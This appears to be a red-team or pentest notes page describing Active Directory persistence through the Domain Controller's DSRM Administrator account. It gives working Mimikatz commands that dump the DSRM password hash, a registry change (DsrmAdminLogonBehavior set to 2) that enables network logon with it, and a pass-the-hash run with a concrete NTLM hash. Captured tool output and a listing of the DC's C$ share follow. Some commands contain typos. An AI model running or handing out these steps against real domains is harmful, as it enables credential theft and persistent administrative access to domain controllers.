

There is a local Administrator on every DC called "Administrator" whose password is the DSRM password(SafeModePassword).
This password is required when a server is promoted to Domain Controller and it is rarely changed
After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC

```powershell
#Dump DSRM password (needs DA privs)
Invoke-Mimikatz-Command '"token::elevate" "lsadump::sam"' -Computername dc
#Compare the Administrator hash with the Administrator hash of below command
Invoke-Mimikatz-Command '"lsadump::lsa/patch"' -Computernamedc
#First one is the DSRM local Administrator.


#Since it is the local administrator of the DC, we can pass the hash to authenticate. 
#But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
Enter-PSSession -Computernamedc 
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

#Use below command to pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"' 
ls\\dc\C$
```

## Example

The Administrator user with RID 500 is the DSRM account 

By default this account cannot logon to the DC form the network, this can be changed with a reg entry



```powershell
[dc.abc.example.local]: PS C:\Users\svcadmin\Documents> New-ItemProperty "HKLM:\System\CurrentControlSet\
Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD


DsrmAdminLogonBehavior : 2
PSPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\
PSParentPath           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control
PSChildName            : Lsa
PSDrive                : HKLM
PSProvider             : Microsoft.PowerShell.Core\Registry
```


Then from a powershell session on any other system in the domain, we can pass the hash as the DSRM Administrator


```powershell
PS C:\Windows\system32> cd \ad\tools

PS C:\ad\tools> . .\Invoke-Mimikatz.ps1

PS C:\ad\tools> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::pth /domain:dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe
user	: Administrator
domain	: dc
program	: powershell.exe
impers.	: no
NTLM	: a102ad5753f4c441e3af31c97fad86fd
  |  PID  5552
  |  TID  4300
  |  LSA Process is now R/W
  |  LUID 0 ; 84723561 (00000000:050cc769)
  \_ msv1_0   - data copy @ 0000021A90637E70 : OK !
  \_ kerberos - data copy @ 0000021A9106A958
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000021A91036228 (32) -> null
```


From this session we can access the DC


```powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> ls \\dc.abc.example.local\c$


    Directory: \\dc.abc.example.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        9/15/2021   2:14 AM                Windows
```
